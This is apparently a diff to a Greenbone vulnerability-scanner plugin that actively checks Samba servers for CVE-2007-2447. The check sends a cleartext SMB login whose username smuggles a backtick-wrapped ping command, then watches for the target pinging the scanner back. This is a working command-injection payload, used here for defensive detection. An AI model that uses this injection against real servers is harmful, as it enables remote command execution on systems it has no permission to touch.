@@ -9,11 +9,11 @@ CPE = "cpe:/a:samba:samba";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108011");
-  script_version("2023-07-20T05:05:17+0000");
+  script_version("2024-11-13T05:05:39+0000");
   script_cve_id("CVE-2007-2447");
   script_tag(name:"cvss_base", value:"6.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
+  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
   script_tag(name:"creation_date", value:"2016-10-31 11:47:00 +0200 (Mon, 31 Oct 2016)");
   script_name("Samba MS-RPC Remote Shell Command Execution Vulnerability - Active Check");
   script_copyright("Copyright (C) 2016 Greenbone AG");
@@ -29,13 +29,17 @@ if(description)
   script_tag(name:"summary", value:"Samba is prone to a vulnerability that allows attackers to
   execute arbitrary shell commands because the software fails to sanitize user-supplied input.");
 
-  script_tag(name:"vuldetect", value:"Send a crafted command to the samba server and check for a
-  remote command execution.");
+  script_tag(name:"vuldetect", value:"Sends a crafted SMB request and checks if the target is
+  connecting back to the scanner host.
+
+  Note: For a successful detection of this flaw the scanner host needs to be able to directly
+  receive ICMP echo requests from the target.");
 
   script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary shell
   commands on an affected system with the privileges of the application.");
 
-  script_tag(name:"solution", value:"Updates are available. Please see the referenced vendor advisory.");
+  script_tag(name:"solution", value:"Updates are available. Please see the referenced vendor
+  advisory.");
 
   script_tag(name:"affected", value:"This issue affects Samba 3.0.0 through 3.0.25rc3.");
 
@@ -48,6 +52,9 @@ if(description)
 include("smb_nt.inc");
 include("host_details.inc");
 include("misc_func.inc");
+include("dump.inc");
+include("list_array_func.inc");
+include("pcap_func.inc");
 
 if( ! port = get_app_port( cpe:CPE ) )
   exit( 0 );
@@ -55,46 +62,70 @@ if( ! port = get_app_port( cpe:CPE ) )
 if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
   exit( 0 );
 
-if( ! soc = open_sock_tcp( port ) )
-  exit( 0 );
+ownhostname = this_host_name();
+ownip = this_host();
+src_filter = pcap_src_ip_filter_from_hostnames();
+dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
+filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );
 
 name = kb_smb_name();
 if( ! name )
   name = "*SMBSERVER";
 
-if( ! r = smb_session_request( soc:soc, remote:name ) )
-  exit( 0 );
+foreach connect_back_target( make_list( ownip, ownhostname ) ) {
 
-vtstrings = get_vt_strings();
-check = vtstrings["ping_string"];
-pattern = hexstr( check );
+  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
+  # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
+  # the fork would be done after calling open_sock_tcp() the child's would share the same socket
+  # causing race conditions and similar.
+  if( ! soc = open_sock_tcp( port ) )
+    continue;
 
-# Vulnerable samba versions are executing the command passed via login
-# smb_session_setup() takes a good amount of time so using 50 ping requests here
-login = '`ping -p ' + pattern + ' -c50 ' + this_host() + '`';
+  if( ! r = smb_session_request( soc:soc, remote:name ) )
+    continue;
 
-#nb: With NTLMSSP_AUTH the login name will be converted to "toupper()" in smb_nt.inc
-#Because of this the ping command will fail so using cleartext login for now
-#prot = smb_neg_prot( soc:soc );
-#if( ! prot ) exit( 0 );
-#smb_session_setup( soc:soc, login:login, password:"", domain:"", prot:prot );
-smb_session_setup_cleartext( soc:soc, login:login, password:"", domain:"" );
+  vtstrings = get_vt_strings();
+  check = vtstrings["ping_string"];
+  pattern = hexstr( check );
 
-max = 50; # Amount of ping requests used in the login above
+  # Vulnerable samba versions are executing the command passed via login
+  # smb_session_setup() takes a good amount of time so using 50 ping requests here
+  login = "`ping -p " + pattern + " -c50 " + connect_back_target + "`";
 
-while( res = send_capture( socket:soc, data:"", pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) ) ) {
+  # nb: With NTLMSSP_AUTH the login name will be converted to "toupper()" in smb_nt.inc
+  # Because of this the ping command will fail so using cleartext login for now
+  #prot = smb_neg_prot( soc:soc );
+  #if( ! prot ) exit( 0 );
+  #smb_session_setup( soc:soc, login:login, password:"", domain:"", prot:prot );
+  smb_session_setup_cleartext( soc:soc, login:login, password:"", domain:"" );
 
-  count++;
-  data = get_icmp_element( icmp:res, element:"data" );
+  max = 50; # Amount of ping requests used in the login above
 
-  if( check >< data ) {
-    close( soc );
-    security_message( port:port );
-    exit( 0 );
+  while( res = send_capture( socket:soc, data:"", pcap_filter:filter ) ) {
+
+    count++;
+
+    type = get_icmp_element( icmp:res, element:"icmp_type" );
+    if( ! type || type != 8 )
+      continue;
+
+    if( ! data = get_icmp_element( icmp:res, element:"data" ) )
+      continue;
+
+    if( check >< data ) {
+      close( soc );
+      report = 'By sending a special crafted SMB request it was possible to execute `' + login  + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
+
+    if( count > max )
+      break;
   }
-  if( count > max )
-    break;
+
+  close( soc );
 }
 
-close( soc );
-exit( 99 );
+# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
+# host isn't reachable by the target host or another IP is responding from our request.
+exit( 0 );
